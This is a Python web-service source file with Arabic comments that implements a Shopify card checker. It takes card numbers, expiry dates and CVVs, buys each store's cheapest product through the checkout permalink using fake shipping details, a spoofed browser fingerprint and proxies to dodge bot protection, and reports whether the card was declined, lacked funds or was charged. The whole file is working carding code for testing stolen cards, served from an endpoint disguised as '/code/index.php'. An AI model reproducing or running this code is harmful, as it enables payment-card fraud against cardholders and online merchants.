from fastapi import FastAPI, Query
from fastapi.responses import JSONResponse
from curl_cffi.requests import AsyncSession
import re
import json
import random
import urllib.parse

app = FastAPI()

def format_proxy(proxy_str):
    if not proxy_str: return None
    parts = proxy_str.split(':')
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return f"http://{user}:{pwd}@{ip}:{port}"
    elif len(parts) == 2:
        ip, port = parts
        return f"http://{ip}:{port}"
    return proxy_str if proxy_str.startswith('http') else f"http://{proxy_str}"

def extract_token_deep(html_text):
    """
    الرادار النووي: يبحث في HTML و JSON و React State المخفية
    """
    patterns = [
        r'name="authenticity_token"\s*value="([^"]+)"',
        r'value="([^"]+)"\s*name="authenticity_token"',
        r'<meta\s+name="csrf-token"\s*content="([^"]+)"',
        r'"authenticity_token"\s*:\s*"([^"]+)"',
        r'authenticity_token\\u0022:\\u0022([^\\]+)\\u0022',
        r'\\u0026authenticity_token=([^&"\'\\]+)',
        r'token":"([a-zA-Z0-9_-]{32,})"' # اصطياد التوكن من نظام React الجديد
    ]
    for p in patterns:
        match = re.search(p, html_text)
        if match: 
            return match.group(1)
    return None

def extract_gateway(html_text):
    patterns = [
        r'name="checkout\[payment_gateway\]"\s*type="radio"\s*value="(\d+)"',
        r'value="(\d+)"\s*name="checkout\[payment_gateway\]"',
        r'"payment_instruments":\[{"id":(\d+)'
    ]
    for p in patterns:
        match = re.search(p, html_text)
        if match: return match.group(1)
    return "1"

async def get_cheapest_product(session, store_url):
    try:
        # استخدام هيدر متصفح حقيقي لتجنب حظر السحب
        headers = {"Accept": "application/json"}
        res = await session.get(f"{store_url}/products.json?limit=250", headers=headers)
        if res.status_code != 200: return None, None
        
        data = res.json()
        cheapest_variant = None
        lowest_price = float('inf')
        
        for product in data.get('products', []):
            for variant in product.get('variants', []):
                if variant.get('available', True): 
                    try:
                        price = float(variant.get('price', 0.0))
                        if 0.0 < price < lowest_price:
                            lowest_price = price
                            cheapest_variant = variant.get('id')
                    except: pass
        
        return cheapest_variant, str(lowest_price) if cheapest_variant else (None, None)
    except:
        return None, None

async def check_shopify(cc_info, store_url, proxy):
    try:
        cc_parts = re.findall(r'\d+', cc_info.replace('|', ' '))
        if len(cc_parts) < 4: return {"Response": "Invalid CC Format", "Price": "-", "Gate": "Shopify API"}
        cc, mm, yy, cvv = cc_parts[0], cc_parts[1], cc_parts[2], cc_parts[3]
        if len(yy) == 2: yy = "20" + yy

        store_url = store_url.rstrip('/')
        formatted_proxy = format_proxy(proxy)
        proxies = {"http": formatted_proxy, "https": formatted_proxy} if formatted_proxy else None

        # استخدام بصمة متصفح Safari لتقليل استهداف Cloudflare للبوتات
        async with AsyncSession(impersonate="safari15_3", proxies=proxies, timeout=60) as session:
            
            # 1. سحب أرخص منتج
            variant_id, price = await get_cheapest_product(session, store_url)
            if not variant_id:
                return {"Response": "No active products found", "Price": "-", "Gate": "Shopify API"}

            # 2. الثغرة (Direct Checkout Permalink) لإنشاء جلسة دفع وتخطي السلة
            checkout_url = f"{store_url}/cart/{variant_id}:1"
            res2 = await session.get(checkout_url, allow_redirects=True)
            html2 = res2.text
            current_url = str(res2.url)
            
            auth_token = extract_token_deep(html2)

            # فحص حماية Cloudflare بشكل دقيق
            if not auth_token:
                title_match = re.search(r'<title>([^<]+)</title>', html2)
                page_title = title_match.group(1).strip() if title_match else "Unknown"
                
                if "Just a moment" in page_title or "Cloudflare" in page_title or res2.status_code in [403, 429]:
                    return {"Response": f"Cloudflare/Datadome Blocked Proxy IP", "Price": f"${price}", "Gate": "Shopify API"}
                
                # إذا لم يجد توكن، سيقوم البوت بإرجاع اسم الصفحة لتعرف أين وقف بالضبط
                return {"Response": f"Token Not Found (Page: {page_title[:20]})", "Price": f"${price}", "Gate": "Shopify API"}

            # 3. محاكاة تعبئة عنوان الشحن (خطوة إجبارية في التحديث الجديد)
            email = f"johndoe{random.randint(10000,99999)}@gmail.com"
            address_payload = {
                "_method": "patch",
                "authenticity_token": auth_token,
                "previous_step": "contact_information",
                "step": "shipping_method",
                "checkout[email]": email,
                "checkout[shipping_address][first_name]": "John",
                "checkout[shipping_address][last_name]": "Doe",
                "checkout[shipping_address][address1]": "123 Main Street",
                "checkout[shipping_address][city]": "New York",
                "checkout[shipping_address][country]": "United States",
                "checkout[shipping_address][province]": "New York",
                "checkout[shipping_address][zip]": "10001",
                "checkout[shipping_address][phone]": "(212) 555-1234",
                "button": ""
            }
            res3 = await session.post(current_url, data=address_payload, allow_redirects=True)
            html3 = res3.text
            current_url = str(res3.url)

            auth_token2 = extract_token_deep(html3) or auth_token

            # 4. تخطي الشحن للوصول للبوابة
            shipping_payload = {
                "_method": "patch",
                "authenticity_token": auth_token2,
                "previous_step": "shipping_method",
                "step": "payment_method",
                "button": ""
            }
            res4 = await session.post(current_url, data=shipping_payload, allow_redirects=True)
            html4 = res4.text
            current_url = str(res4.url)

            auth_token3 = extract_token_deep(html4) or auth_token2
            gateway_id = extract_gateway(html4)

            # 5. تشفير البطاقة داخل سيرفرات الدفع (Stripe/Shopify)
            token_url = "https://deposit.us.shopifycs.com/sessions"
            token_payload = {"credit_card": {"number": cc, "name": "John Doe", "month": mm, "year": yy, "verification_value": cvv}}
            token_headers = {
                "Accept": "application/json", 
                "Content-Type": "application/json",
                "Origin": "https://checkout.shopifycs.com"
            }
            
            res5 = await session.post(token_url, json=token_payload, headers=token_headers)
            if res5.status_code != 200: 
                return {"Response": "Failed to tokenize card (Shopify Banned Proxy)", "Price": f"${price}", "Gate": "Shopify API"}
            
            payment_token = res5.json().get("id")

            # 6. الهجوم النهائي (إرسال الدفع)
            payment_payload = {
                "_method": "patch",
                "authenticity_token": auth_token3,
                "previous_step": "payment_method",
                "step": "",
                "s": payment_token,
                "checkout[payment_gateway]": gateway_id, 
                "checkout[credit_card][vault]": "false",
                "checkout[different_billing_address]": "false",
                "complete": "1"
            }
            
            res6 = await session.post(current_url, data=payment_payload, allow_redirects=True)
            result_html = res6.text.lower()
            
            # 7. قراءة الرد بدقة متناهية
            if "thank you" in result_html or "order completed" in result_html or res6.url.endswith('/thank_you'):
                return {"Response": "Order completed 💎", "Price": f"${price}", "Gate": "Shopify API"}
            elif "insufficient funds" in result_html or "not enough funds" in result_html: 
                return {"Response": "Insufficient Funds", "Price": f"${price}", "Gate": "Shopify API"}
            elif "incorrect_cvc" in result_html or "security code was not matched" in result_html: 
                return {"Response": "Incorrect CVC", "Price": f"${price}", "Gate": "Shopify API"}
            elif "zip code does not match" in result_html or "avs" in result_html: 
                return {"Response": "ZIP Code Mismatch", "Price": f"${price}", "Gate": "Shopify API"}
            elif "do not honor" in result_html or "generic_decline" in result_html: 
                return {"Response": "Do Not Honor", "Price": f"${price}", "Gate": "Shopify API"}
            else:
                error_match = re.search(r'class="field__message field__message--error">([^<]+)<', res6.text)
                if error_match: return {"Response": error_match.group(1).strip(), "Price": f"${price}", "Gate": "Shopify API"}
                return {"Response": "Declined / Custom Gate Error", "Price": f"${price}", "Gate": "Shopify API"}

    except Exception as e:
        err_str = str(e).lower().replace("proxy", "prx").replace("connection", "conn").replace("timeout", "t-out")
        return {"Response": f"Sys_Err: {err_str[:40]}", "Price": "-", "Gate": "Shopify API"}

@app.get("/code/index.php")
async def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query(None)):
    result = await check_shopify(cc, url, proxy)
    return JSONResponse(content=result)
